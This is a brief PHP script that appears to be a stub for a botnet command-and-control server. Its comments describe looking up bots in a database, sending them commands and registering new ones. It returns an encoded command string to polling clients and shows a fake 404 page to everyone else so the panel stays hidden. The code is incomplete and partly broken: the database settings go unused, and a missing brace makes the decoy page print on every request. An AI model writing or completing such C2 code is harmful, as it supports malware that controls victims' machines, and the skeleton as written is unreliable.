<?php
define("SQLHOST", "127.0.0.1");
define("SQLNAME", "test");
define("SQLUSER", "root");
define("SQLPASS", "");

if (isset($_GET['get']))
	//Get get, Check SQL for match
	//if match found check for commands
	//if match not found add to known bots
  echo "QUxMfDF8aHR0cDovL3d3dy5nb29nbGUuY29tfFY";
elseif (isset($_GET['test']))
	echo "ok";
else
	echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n"; 
	echo "<HTML><HEAD>\n"; 
	echo "<TITLE>404 Not Found</TITLE>\n"; 
	echo "</HEAD><BODY>\n"; 
	echo "<H1>Not Found</H1>\n"; 
	echo "The requested URL was not found on this server.\n"; 
	echo "</BODY></HTML>\n"; 
	echo "\n";

?>
